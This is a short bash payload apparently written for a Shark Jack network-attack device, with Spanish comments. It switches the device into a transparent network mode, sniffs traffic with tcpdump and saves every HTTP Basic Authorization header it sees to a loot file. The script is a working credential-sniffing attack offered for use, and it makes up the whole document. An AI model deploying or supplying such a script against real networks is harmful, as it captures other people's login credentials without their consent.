#!/bin/bash
# Shark Jack script: Detect Basic HTTP Authentication

LED SETUP
# Configurar la interfaz de red en modo TRANSPARENT
NETMODE TRANSPARENT
LED ATTACK

# Iniciar captura de paquetes y buscar encabezados de autenticación básica HTTP
tcpdump -i eth0 -A -l | grep -i "Authorization: Basic" >> /root/loot/http_basic_auth.txt

LED FINISH
